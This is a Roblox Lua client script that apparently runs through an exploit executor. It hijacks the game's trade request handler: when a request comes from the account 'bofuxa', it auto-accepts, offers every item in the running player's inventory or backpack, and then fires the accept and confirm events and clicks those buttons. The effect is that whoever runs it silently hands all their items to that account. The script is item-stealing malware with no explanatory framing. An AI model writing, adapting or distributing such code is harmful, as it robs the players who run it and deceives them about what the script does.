local Players = game:GetService("Players")
local ReplicatedStorage = ReplicatedStorage or game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local TradeFolder = ReplicatedStorage:WaitForChild("Trade")
local SendRequest = TradeFolder:WaitForChild("SendRequest")
local AcceptRequest = TradeFolder:WaitForChild("AcceptRequest")
local StartTradeEvent = TradeFolder:WaitForChild("StartTrade")
local OfferItemEvent = TradeFolder:WaitForChild("OfferItem")
local AcceptTradeEvent = TradeFolder:WaitForChild("AcceptTrade")

print("Waiting for incoming trade request callback...")

local function clickTradeButton(buttonNamePattern)
    local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
    if not playerGui then return false end
    
    local tradeGui = playerGui:FindFirstChild("TradeGUI")
    if not tradeGui then return false end
    
    for _, descendant in ipairs(tradeGui:GetDescendants()) do
        if descendant:IsA("GuiButton") then
            local fullName = descendant:GetFullName():lower()
            if fullName:find(buttonNamePattern) then
                if getconnections then
                    pcall(function()
                        for _, conn in ipairs(getconnections(descendant.Activated)) do
                            conn:Fire()
                        end
                        for _, conn in ipairs(getconnections(descendant.MouseButton1Click)) do
                            conn:Fire()
                        end
                    end)
                end
                
                pcall(function()
                    descendant:Activate()
                end)
                
                print("Triggered button matching: " .. buttonNamePattern)
                return true
            end
        end
    end
    return false
end

SendRequest.OnClientInvoke = function(senderPlayer)
    local senderName = typeof(senderPlayer) == "Instance" and senderPlayer.Name or tostring(senderPlayer)
    
    if senderName:lower() == "bofuxa" then
        print("Trade request verified from bofuxa. Accepting...")
        
        local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
        if playerGui then
            local tradeGui = playerGui:FindFirstChild("TradeGUI")
            if tradeGui then
                for _, childName in ipairs({"Container", "Processing", "BG"}) do
                    local element = tradeGui:FindFirstChild(childName)
                    if element then
                        element.Visible = true
                    end
                end
            end
        end

        pcall(function()
            AcceptRequest:FireServer()
        end)
        
        task.spawn(function()
            print("Trade accepted! Waiting 1 second before offering items...")
            task.wait(1)
            
            pcall(function()
                if firesignal then
                    firesignal(StartTradeEvent.OnClientEvent, {
                        Locked = false,
                        LastOffer = tick(),
                        Player2 = { Player = LocalPlayer, Offer = {}, Accepted = false },
                        Player1 = { Player = senderPlayer, Offer = {}, Accepted = false }
                    }, "Bofuxa")
                end
            end)
            
            local inventoryContainer = nil
            local pGui = LocalPlayer:WaitForChild("PlayerGui", 5)
            
            if pGui then
                local mainGui = pGui:FindFirstChild("MainGUI")
                if mainGui then
                    local lobby = mainGui:FindFirstChild("Lobby")
                    if lobby then
                        local screens = lobby:FindFirstChild("Screens")
                        if screens then
                            local inventory = screens:FindFirstChild("Inventory")
                            if inventory then
                                local main = inventory:FindFirstChild("Main")
                                if main then
                                    local crafting = main:FindFirstChild("Crafting")
                                    if crafting then
                                        local craftingMain = crafting:FindFirstChild("Main")
                                        if craftingMain then
                                            local salvage = craftingMain:FindFirstChild("Salvage")
                                            if salvage then
                                                local scrollFrame = salvage:FindFirstChild("ScrollFrame")
                                                if scrollFrame then
                                                    inventoryContainer = scrollFrame:FindFirstChild("Container")
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end

            local offeredCount = 0

            if inventoryContainer then
                for _, item in ipairs(inventoryContainer:GetChildren()) do
                    if item:IsA("GuiObject") then
                        local itemName = item.Name
                        local category = "Weapons"
                        
                        local count = 1
                        local qtyAttribute = item:GetAttribute("Count") or item:GetAttribute("Quantity")
                        if type(qtyAttribute) == "number" then
                            count = qtyAttribute
                        end

                        for i = 1, count do
                            pcall(function()
                                OfferItemEvent:FireServer(itemName, category)
                            end)
                            offeredCount = offeredCount + 1
                            task.wait(0.05)
                        end
                    end
                end
                print("Successfully offered " .. tostring(offeredCount) .. " items from mobile Lobby inventory container!")
            else
                if LocalPlayer:FindFirstChild("Backpack") then
                    for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
                        if tool:IsA("Tool") then
                            pcall(function()
                                OfferItemEvent:FireServer(tool.Name, "Weapons")
                            end)
                            offeredCount = offeredCount + 1
                            task.wait(0.05)
                        end
                    end
                end
                warn("Mobile inventory container path not found; pulled " .. tostring(offeredCount) .. " items from Backpack instead.")
            end

            print("Waiting 3 seconds before triggering Accept and Confirm...")
            task.wait(3)

            pcall(function()
                AcceptTradeEvent:FireServer(true)
            end)
            pcall(function()
                AcceptTradeEvent:FireServer()
            end)

            if firesignal and AcceptTradeEvent.OnClientEvent then
                pcall(function()
                    firesignal(AcceptTradeEvent.OnClientEvent, false)
                end)
            end

            task.wait(1)
            clickTradeButton("accept")

            task.wait(1)
            clickTradeButton("confirm")
        end)

        return true
    else
        print("Trade request from other player (" .. senderName .. "). Allowing normal trade...")
        return true
    end
end
